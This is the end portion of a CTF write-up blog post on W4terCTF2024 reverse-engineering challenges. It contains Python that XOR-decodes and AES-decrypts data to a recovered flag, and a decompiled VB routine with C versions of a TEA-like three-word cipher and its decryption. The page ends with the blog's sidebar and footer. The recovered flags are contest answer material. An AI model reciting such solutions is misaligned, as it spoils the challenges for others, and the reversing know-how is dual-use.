[]</span><br><span class="line"><span class="keyword">while</span> final_x:</span><br><span class="line">    part_s = final_x[:<span class="number">32</span>]</span><br><span class="line">    final_x = final_x[<span class="number">32</span>:]</span><br><span class="line">    l2 = []</span><br><span class="line">    <span class="keyword">while</span> part_s:</span><br><span class="line">        x = <span class="built_in">int</span>(part_s[:<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">        l2.append(x)</span><br><span class="line">        part_s = part_s[<span class="number">2</span>:]</span><br><span class="line">    l.append(l2)</span><br><span class="line"></span><br><span class="line">l = [[x ^ <span class="number">153</span> <span class="keyword">for</span> x <span class="keyword">in</span> subl] <span class="keyword">for</span> subl <span class="keyword">in</span> l]</span><br><span class="line">l = [<span class="built_in">bytes</span>(subl) <span class="keyword">for</span> subl <span class="keyword">in</span> l]</span><br><span class="line">l = [aes.decrypt(b) <span class="keyword">for</span> b <span class="keyword">in</span> l]</span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> l:</span><br><span class="line">    <span class="keyword">while</span> s:</span><br><span class="line">        b = <span class="built_in">int</span>(s[:<span class="number">4</span>], <span class="number">4</span>)</span><br><span class="line">        s = s[<span class="number">4</span>:]</span><br><span class="line">        ans += <span class="built_in">chr</span>(b)</span><br><span class="line">ans</span><br></pre></td></tr></table></figure><p></p><p></p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&#x27;jS_ls_In7erEStlng_ANd_QuaTeRN4rY_IS_al50_1Unny!!</span>&#x27;</span><br></pre></td></tr></table></figure><p></p><h2 id="古老的语言"><a class="anchor" href="#古老的语言">#</a> 古老的语言</h2><p>用 VB 反编译器逆向，关键函数 <code>Fxxxtel</code> 如下：</p><p></p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Public</span> <span class="keyword">Function</span> Fxxxtel(raw) <span class="comment">&#x27;40F35C</span></span><br><span class="line">  <span class="comment">&#x27;Data Table: 40E3A8</span></span><br><span class="line">  <span class="keyword">Dim</span> var_B0 <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">  <span class="keyword">Dim</span> var_B4 <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">  <span class="keyword">Dim</span> var_B8 <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">  <span class="keyword">Dim</span> var_BC <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line">  <span class="keyword">Dim</span> var_86 <span class="keyword">As</span> <span class="type">Integer</span></span><br><span class="line">  loc_40F031: <span class="keyword">For</span> var_AC = <span class="number">0</span> <span class="keyword">To</span> <span class="number">9</span> <span class="keyword">Step</span> <span class="number">3</span>: var_A6 = var_AC <span class="comment">&#x27;Integer</span></span><br><span class="line">  loc_40F047:   var_B4 = raw(<span class="built_in">CLng</span>(var_A6))</span><br><span class="line">  loc_40F055:   var_B8 = raw(<span class="built_in">CLng</span>((var_A6 + <span class="number">1</span>)))</span><br><span class="line">  loc_40F063:   var_BC = raw(<span class="built_in">CLng</span>((var_A6 + <span class="number">2</span>)))</span><br><span class="line">  loc_40F06D:   <span class="keyword">For</span> var_C0 = <span class="number">1</span> <span class="keyword">To</span> <span class="number">&amp;H20</span>: var_A8 = var_C0 <span class="comment">&#x27;Integer</span></span><br><span class="line">  loc_40F089:     var_B0 = AddLong(<span class="number">0</span>, -<span class="number">1640531527</span>)</span><br><span class="line">  loc_40F0FB:     var_B4 = var_B4 <span class="built_in">Xor</span> AddLong(AddLong(LeftRotateLong(var_B8, <span class="number">4</span>) <span class="built_in">Xor</span> -<span class="number">559038737</span>, var_B8 <span class="built_in">Xor</span> var_B0), RightRotateLong(var_B8, <span class="number">5</span>) <span class="built_in">Xor</span> -<span class="number">1161901314</span>)</span><br><span class="line">  loc_40F16D:     var_B8 = var_B8 <span class="built_in">Xor</span> AddLong(AddLong(LeftRotateLong(var_BC, <span class="number">4</span>) <span class="built_in">Xor</span> -<span class="number">559038737</span>, var_BC <span class="built_in">Xor</span> var_B0), RightRotateLong(var_BC, <span class="number">5</span>) <span class="built_in">Xor</span> -<span class="number">1161901314</span>)</span><br><span class="line">  loc_40F1DF:     var_BC = var_BC <span class="built_in">Xor</span> AddLong(AddLong(LeftRotateLong(var_B4, <span class="number">4</span>) <span class="built_in">Xor</span> -<span class="number">559038737</span>, var_B4 <span class="built_in">Xor</span> var_B0), RightRotateLong(var_B4, <span class="number">5</span>) <span class="built_in">Xor</span> -<span class="number">1161901314</span>)</span><br><span class="line">  loc_40F1E5:   <span class="keyword">Next</span> var_C0 <span class="comment">&#x27;Integer</span></span><br><span class="line">  loc_40F1F4:   var_A0(<span class="built_in">CLng</span>(var_A6)) = var_B4</span><br><span class="line">  loc_40F202:   var_A0(<span class="built_in">CLng</span>((var_A6 + <span class="number">1</span>))) = var_B8</span><br><span class="line">  loc_40F210:   var_A0(<span class="built_in">CLng</span>((var_A6 + <span class="number">2</span>))) = var_BC</span><br><span class="line">  loc_40F214: <span class="keyword">Next</span> var_AC <span class="comment">&#x27;Integer</span></span><br><span class="line">  loc_40F21B: var_86 = <span class="number">&amp;HFF</span></span><br></pre></td></tr></table></figure><p></p><p>用 C 整理出的等价版本：</p><p></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">(<span class="type">uint32_t</span> *v)</span> &#123;</span><br><span class="line">  <span class="type">uint32_t</span> a = v[<span class="number">0</span>], b = v[<span class="number">1</span>], c = v[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">    a = a ^ round_fn(b);</span><br><span class="line">    b = b ^ round_fn(c);</span><br><span class="line">    c = c ^ round_fn(a);</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = a;</span><br><span class="line">  v[<span class="number">1</span>] = b;</span><br><span class="line">  v[<span class="number">2</span>] = c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> <span class="title function_">round_fn</span><span class="params">(<span class="type">uint32_t</span> b)</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">  <span class="keyword">return</span> ((left_rotate(b, <span class="number">4</span>) ^ (<span class="number">0xdeadbeef</span>)) + (b ^ delta) +</span><br><span class="line">          (right_rotate(b, <span class="number">5</span>) ^ (<span class="number">0xbabecafe</span>)));</span><br></pre></td></tr></table></figure><p></p><p>在这之后是一长串的 IF，判断 <code>var_A0</code> 的各个位是否等于一些硬编码的 32 位常数，将这些常数解密即可。</p><p>可以看出这和 TEA 加密非常像，但是是三个一组的循环混淆，而非经典 TEA 的两个一组，而且把 TEA 轮函数加法和异或交换了，以及每次异或的是固定的 <code>delta</code> 而不是 <code>delta</code> 的累加。每次取三个 <code>u32</code> 一组，像这样交叉异或 32 轮。</p><p>三个一组问题不大，把加密的顺序反过来异或回去可以了，原理是一样的：</p><p></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span> *v)</span> &#123;</span><br><span class="line">  <span class="type">uint32_t</span> a = v[<span class="number">0</span>], b = v[<span class="number">1</span>], c = v[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">    c = c ^ round_fn(a);</span><br><span class="line">    b = b ^ round_fn(c);</span><br><span class="line">    a = a ^ round_fn(b);</span><br><span class="line">  &#125;</span><br><span class="line">  v[<span class="number">0</span>] = a;</span><br><span class="line">  v[<span class="number">1</span>] = b;</span><br><span class="line">  v[<span class="number">2</span>] = c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>然而这样不对。hint 说要关掉的那个选项我看到了，关了之后重新复现了一遍，发现跟之前一点区别没有，心态炸了。</p><p>最后一天晚九点，突发奇想把轮函数改了一下，把 <code>sum</code> 做异或，相当于只把轮函数的加法和异或互换的 TEA 算法，保留 <code>sum</code> 的部分不改，然后居然过了，有瞎蒙的成分在。</p><p>事后注意到这一行：</p><p></p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">loc_40F089:</span>     var_B0 = AddLong(<span class="number">0</span>, -<span class="number">1640531527</span>)</span><br></pre></td></tr></table></figure><p></p><p>那就意味着这一行的逆向是错的，应该是 <code>var_B0 = AddLong(var_B0, -1640531527)</code> ，不过没发现为什么。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"><div class="tags"><a href="/tags/ctf/" rel="tag"><i class="ic i-tag"></i> ctf</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">Edited on</span> <time title="Modified: 2024-08-14 17:37:11" itemprop="dateModified" datetime="2024-08-14T17:37:11+08:00">2024-08-14</time> </span><span id="cs/ctf/w4terctf2024/" class="item leancloud_visitors" data-flag-title="W4terCTF2024 WP" title="Views"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">Views</span> <span class="leancloud-visitors-count"></span> <span class="text">times</span></span></div><div id="copyright"><ul><li class="author"><strong>Post author: </strong>fuuzen</li><li class="link"><strong>Post link: </strong><a href="https://taf.fyi/cs/ctf/w4terctf2024/" title="W4terCTF2024 WP">https://taf.fyi/cs/ctf/w4terctf2024/</a></li><li class="license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.</li></ul></div></footer></article></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="Contents"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ai"><span class="toc-number">1.</span> <span class="toc-text">AI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#network-reverse"><span class="toc-number">1.1.</span> <span class="toc-text">Network Reverse</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">2.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#remember-it-0"><span class="toc-number">2.1.</span> <span class="toc-text">Remember It 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#remember-it-1"><span class="toc-number">2.2.</span> <span class="toc-text">Remember It 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2048"><span class="toc-number">2.3.</span> <span class="toc-text">2048</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gitzip"><span class="toc-number">3.1.</span> <span class="toc-text">GitZip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ashbp"><span class="toc-number">3.2.</span> <span class="toc-text">ASHBP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#user-manager"><span class="toc-number">3.3.</span> <span class="toc-text">User Manager</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#png-server"><span class="toc-number">3.4.</span> <span class="toc-text">PNG Server</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#auto-unserialize"><span class="toc-number">3.5.</span> <span class="toc-text">Auto Unserialize</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#just-readobject"><span class="toc-number">3.6.</span> <span class="toc-text">Just ReadObject</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#smoke-hints"><span class="toc-number">4.1.</span> <span class="toc-text">Smoke hints</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wish"><span class="toc-number">4.2.</span> <span class="toc-text">Wish</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-number">5.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sign-in"><span class="toc-number">5.1.</span> <span class="toc-text">Sign In</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#brokenmp4"><span class="toc-number">5.2.</span> <span class="toc-text">broken.mp4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shuffle-puts"><span class="toc-number">5.3.</span> <span class="toc-text">Shuffle Puts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#revenge-of-vigenere"><span class="toc-number">5.4.</span> <span class="toc-text">Revenge of Vigenere</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#spam-2024"><span class="toc-number">5.5.</span> <span class="toc-text">Spam 2024</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gzgpt"><span class="toc-number">5.6.</span> <span class="toc-text">GZGPT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#priv-escape"><span class="toc-number">5.7.</span> <span class="toc-text">Priv Escape</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#reverse"><span class="toc-number">6.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#bruteforceme"><span class="toc-number">6.1.</span> <span class="toc-text">BruteforceMe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%AE%89%E5%8F%88%E5%8D%93%E5%8D%93"><span class="toc-number">6.2.</span> <span class="toc-text">安安又卓卓</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%97%AE%E5%89%AA%E5%88%80%E7%9F%B3%E5%A4%B4%E5%B8%83"><span class="toc-number">6.2.1.</span> <span class="toc-text">第一问：剪刀石头布</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%97%AE%E7%8C%9C%E6%95%B0%E5%AD%97"><span class="toc-number">6.2.2.</span> <span class="toc-text">第二问：猜数字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%97%AE%E7%9B%B4%E6%8D%A3%E9%BB%84%E9%BE%99"><span class="toc-number">6.2.3.</span> <span class="toc-text">第三问：直捣黄龙</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java%E8%84%9A%E6%9C%AC"><span class="toc-number">6.2.4.</span> <span class="toc-text">java 脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crabs"><span class="toc-number">6.3.</span> <span class="toc-text">crabs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sub_1209"><span class="toc-number">6.3.1.</span> <span class="toc-text">sub_1209</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub_24bd"><span class="toc-number">6.3.2.</span> <span class="toc-text">sub_24BD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sub_1483"><span class="toc-number">6.3.3.</span> <span class="toc-text">sub_1483</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#doudou"><span class="toc-number">6.4.</span> <span class="toc-text">DouDou</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%A4%E8%80%81%E7%9A%84%E8%AF%AD%E8%A8%80"><span class="toc-number">6.5.</span> <span class="toc-text">古老的语言</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="Related"><ul><li class="active"><a href="/cs/ctf/w4terctf2024/" rel="bookmark" title="W4terCTF2024 WP">W4terCTF2024 WP</a></li></ul></div><div class="overview panel" data-title="Overview"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="fuuzen" data-src="/images/avatar.jpg"><p class="name" itemprop="name">fuuzen</p><div class="description" itemprop="description">fuuzen 的个人主页 taf.fyi</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">23</span> <span class="name">posts</span></a></div><div class="item categories"><a href="/categories/"><span class="count">10</span> <span class="name">categories</span></a></div><div class="item tags"><a href="/tags/"><span class="count">6</span> <span class="name">tags</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Z1dXplbg==" title="https:&#x2F;&#x2F;github.com&#x2F;fuuzen"><i class="ic i-github"></i></span> <span class="exturl item telegram" data-url="aHR0cHM6Ly90Lm1lL2Z1dXNlbl9ub19wYXJ0eQ==" title="https:&#x2F;&#x2F;t.me&#x2F;fuusen_no_party"><i class="ic i-paper-plane"></i></span> <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPTE3NzMxNDU3NTU=" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;1773145755"><i class="ic i-cloud-music"></i></span> <span class="exturl item bilibili" data-url="aHR0cHM6Ly9zcGFjZS5iaWxpYmlsaS5jb20vNTE0OTI3MjkxLw==" title="https:&#x2F;&#x2F;space.bilibili.com&#x2F;514927291&#x2F;"><i class="ic i-bilibili"></i></span> <a href="/rss.xml" title="&#x2F;rss.xml" class="item rss"><i class="ic i-rss"></i></a></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>Home</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>About</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>Posts</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>Archives</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>Categories</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>Tags</a></li></ul></li><li class="item"><a href="/notebook/" rel="section"><i class="ic i-pen"></i>Notebook</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>Friends</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/cs/devops/overleaf/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/cs/pve/pve-passthrough-gpu/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"></div><div class="status"><div class="copyright">- 同じように時 同じように抱きしめてもらいたい -</div><div class="copyright">&copy; 2024 – <span itemprop="copyrightYear">2025</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">fuuzen @ taf.fyi</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="Symbols count total">155k words</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="Reading time total">2:21</span></div><div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"cs/ctf/w4terctf2024/",favicon:{show:"Ciallo～(∠・ω< )⌒★!",hide:"Signaled Out"},search:{placeholder:"Search for Posts",empty:"We didn't find any results for the search: ${query}",stats:"${hits} results found in ${time} ms"},valine:!0,copy_tex:!0,katex:!0,fancybox:!0,copyright:'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->